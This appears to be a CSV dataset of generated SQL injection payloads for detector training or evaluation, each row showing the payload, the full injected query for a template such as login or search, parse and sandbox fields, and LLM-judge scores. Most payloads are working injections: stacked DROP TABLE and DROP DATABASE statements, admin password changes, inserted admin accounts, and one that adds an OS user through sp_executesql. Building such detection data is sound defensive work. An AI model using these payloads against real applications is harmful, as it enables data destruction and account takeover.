query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00222,' OR SLEEP(5); DROP TABLE sessions;,SELECT * FROM products WHERE name LIKE '%' OR SLEEP(5); DROP TABLE sessions;%',stacked_queries,search,1,0,0.0,True,default,"[""Table"", ""Star"", ""Anonymous"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Drop"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00223,"1' UNION ALL SELECT NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_name='admin'--","SELECT * FROM products WHERE name LIKE '%1' UNION ALL SELECT NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_name='admin'--%'",stacked_queries,search,1,0,0.0,True,default,"[""Null"", ""Table"", ""Star"", ""Union"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00225,"--('; DROP TABLE orders;""","SELECT * FROM products WHERE name LIKE '%--('; DROP TABLE orders;""%'",stacked_queries,search,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00227,--%' ; DROP TABLE products;,SELECT * FROM products WHERE name LIKE '%--%' ; DROP TABLE products;%',stacked_queries,search,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00228,"--%' UNION SELECT null, null, null, null FROM products --","SELECT * FROM products WHERE name LIKE '%--%' UNION SELECT null, null, null, null FROM products --%'",stacked_queries,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00229,%' AND 1/(SELECT CASE WHEN 1=1 THEN 0 ELSE 1/0 END)--,SELECT * FROM products WHERE name LIKE '%%' AND 1/(SELECT CASE WHEN 1=1 THEN 0 ELSE 1/0 END)--%',stacked_queries,search,1,0,0.0,True,default,"[""Div"", ""Table"", ""Star"", ""Where"", ""Column"", ""From"", ""And"", ""Identifier"", ""Case"", ""Select"", ""If"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00230,%' OR EXISTS(SELECT * FROM users WHERE username='admin')#,SELECT * FROM products WHERE name LIKE '%%' OR EXISTS(SELECT * FROM users WHERE username='admin')#%',stacked_queries,search,1,0,0.0,True,mysql,"[""Table"", ""Exists"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00232,'; EXECUTE IMMEDIATE 'DROP DATABASE sql_injection_test'; --,SELECT * FROM users WHERE id = '; EXECUTE IMMEDIATE 'DROP DATABASE sql_injection_test'; --,stacked_queries,user_lookup,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""Semicolon"", ""Command"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00233,' OR '1'='1'; ALTER USER sa WITH PASSWORD 'new_password';--,SELECT * FROM users WHERE id = ' OR '1'='1'; ALTER USER sa WITH PASSWORD 'new_password';--,stacked_queries,user_lookup,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Semicolon"", ""Command"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00234,"' UNION ALL SELECT NULL,NULL,'malicious_code',NULL;","SELECT * FROM users WHERE id = ' UNION ALL SELECT NULL,NULL,'malicious_code',NULL;",stacked_queries,user_lookup,1,0,0.0,True,default,"[""Null"", ""Table"", ""Star"", ""Union"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,union_based,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00235,'; DECLARE @cmd VARCHAR(8000); SET @cmd = 'net user evil_user new_password /add'; EXEC sp_executesql @cmd;--,SELECT * FROM users WHERE id = '; DECLARE @cmd VARCHAR(8000); SET @cmd = 'net user evil_user new_password /add'; EXEC sp_executesql @cmd;--,stacked_queries,user_lookup,1,0,0.0,True,postgres,"[""Var"", ""Table"", ""Star"", ""SetItem"", ""Column"", ""From"", ""Semicolon"", ""Command"", ""Identifier"", ""Parameter"", ""Select"", ""Set"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00236,"--; INSERT INTO users(username, password) VALUES('admin', 'password'); --","SELECT * FROM users WHERE id = --; INSERT INTO users(username, password) VALUES('admin', 'password'); --",stacked_queries,user_lookup,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00237,--'; OR '1'='1' --,SELECT * FROM users WHERE id = --'; OR '1'='1' --,stacked_queries,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00239,/*'; DROP USER admin; --*/,SELECT * FROM users WHERE id = /*'; DROP USER admin; --*/,stacked_queries,user_lookup,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00241,; UPDATE statuses SET status = 'processed' WHERE id = 1 ; SELECT * FROM orders WHERE 1=1 --,SELECT * FROM orders WHERE status = '; UPDATE statuses SET status = 'processed' WHERE id = 1 ; SELECT * FROM orders WHERE 1=1 --' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""Update"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00242,; ALTER USER admin IDENTIFIED BY 'new_password' ; --,SELECT * FROM orders WHERE status = '; ALTER USER admin IDENTIFIED BY 'new_password' ; --' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Semicolon"", ""Command""]",True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00243,; --('); INSERT INTO admin (password) VALUES ('hacked'); --,SELECT * FROM orders WHERE status = '; --('); INSERT INTO admin (password) VALUES ('hacked'); --' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Semicolon""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00244,'; COMMIT; ALTER USER admin IDENTIFIED BY 'sqlinjection'; --,SELECT * FROM orders WHERE status = ''; COMMIT; ALTER USER admin IDENTIFIED BY 'sqlinjection'; --' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""Semicolon"", ""Command"", ""Commit"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00245,"/* DROP DATABASE IF EXISTS 'test_db'; */--""","INSERT INTO comments (user_id, body) VALUES (1, '/* DROP DATABASE IF EXISTS 'test_db'; */--""')",stacked_queries,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00246,; UPDATE comments SET user_id = 'admin';--,"INSERT INTO comments (user_id, body) VALUES (1, '; UPDATE comments SET user_id = 'admin';--')",stacked_queries,comment_insert,1,0,0.0,True,default,"[""Table"", ""Column"", ""Semicolon"", ""Update"", ""Identifier"", ""Literal"", ""EQ""]",True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00247,"-- AND 1=1 UNION ALL SELECT NULL, CONCAT('x','y','z'), NULL FROM users","INSERT INTO comments (user_id, body) VALUES (1, '-- AND 1=1 UNION ALL SELECT NULL, CONCAT('x','y','z'), NULL FROM users')",stacked_queries,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00248,; EXECUTE IMMEDIATE 'ALTER TABLE comments ADD COLUMN sensitive_info TEXT'; --,"INSERT INTO comments (user_id, body) VALUES (1, '; EXECUTE IMMEDIATE 'ALTER TABLE comments ADD COLUMN sensitive_info TEXT'; --')",stacked_queries,comment_insert,1,0,0.0,True,default,"[""Semicolon"", ""Command"", ""Literal""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00250,'; DECLARE @cmd VARCHAR(30); SET @cmd = 'DELETE FROM comments'; EXEC sp_executesql @cmd; --,"INSERT INTO comments (user_id, body) VALUES (1, ''; DECLARE @cmd VARCHAR(30); SET @cmd = 'DELETE FROM comments'; EXEC sp_executesql @cmd; --')",stacked_queries,comment_insert,1,0,0.0,True,postgres,"[""Var"", ""Table"", ""Star"", ""SetItem"", ""Column"", ""From"", ""Semicolon"", ""Command"", ""Identifier"", ""Parameter"", ""Select"", ""Set"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00251,--' OR 1=1 LIMIT 1 --,"INSERT INTO comments (user_id, body) VALUES (1, '--' OR 1=1 LIMIT 1 --')",stacked_queries,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00252,"--/*'""` OR '","SELECT * FROM users WHERE username = '--/*'""` OR '' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00254,--//'/--,SELECT * FROM users WHERE username = '--//'/--' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00255,"#!/usr/bin/env sql
SELECT * FROM users WHERE username = ''/**/AND '1'='1' -- AND password = 'anything'","SELECT * FROM users WHERE username = '#!/usr/bin/env sql
SELECT * FROM users WHERE username = ''/**/AND '1'='1' -- AND password = 'anything'' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,True,mysql,"[""Table"", ""Star"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,complete_query,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00256,";/*!*/SELECT /*+ NO_INDEX(users,pk_users) */ * FROM users WHERE username = 'admin' AND password = 'admin' --","SELECT * FROM users WHERE username = ';/*!*/SELECT /*+ NO_INDEX(users,pk_users) */ * FROM users WHERE username = 'admin' AND password = 'admin' --' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Anonymous"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""Hint"", ""Semicolon"", ""Where"", ""Literal"", ""EQ""]",True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00257,'admin'/**/OR/**/'1'='1'/**/--,SELECT * FROM users WHERE username = ''admin'/**/OR/**/'1'='1'/**/--' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""Literal"", ""EQ""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00258,/*'*/SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything',SELECT * FROM users WHERE username = '/*'*/SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00259,"--/*'"" OR '1","SELECT * FROM users WHERE username = '--/*'"" OR '1' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00260,' OR 'admin' LIKE 'admin' --,SELECT * FROM users WHERE username = '' OR 'admin' LIKE 'admin' --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Like"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00261,/*'# SELECT * FROM users WHERE username = 'admin' AND password IS NULL,SELECT * FROM users WHERE username = '/*'# SELECT * FROM users WHERE username = 'admin' AND password IS NULL' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,mysql,"[""Table"", ""Star"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00263,--%'; DROP TABLE users; --,SELECT * FROM products WHERE name LIKE '%--%'; DROP TABLE users; --%',comment_obfuscation,search,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00264,/*%'; WAITFOR DELAY '0:0:10'; --*/,SELECT * FROM products WHERE name LIKE '%/*%'; WAITFOR DELAY '0:0:10'; --*/%',comment_obfuscation,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00266,"--%'; INSERT INTO logs VALUES ('exploit', 'admin'); --","SELECT * FROM products WHERE name LIKE '%--%'; INSERT INTO logs VALUES ('exploit', 'admin'); --%'",comment_obfuscation,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
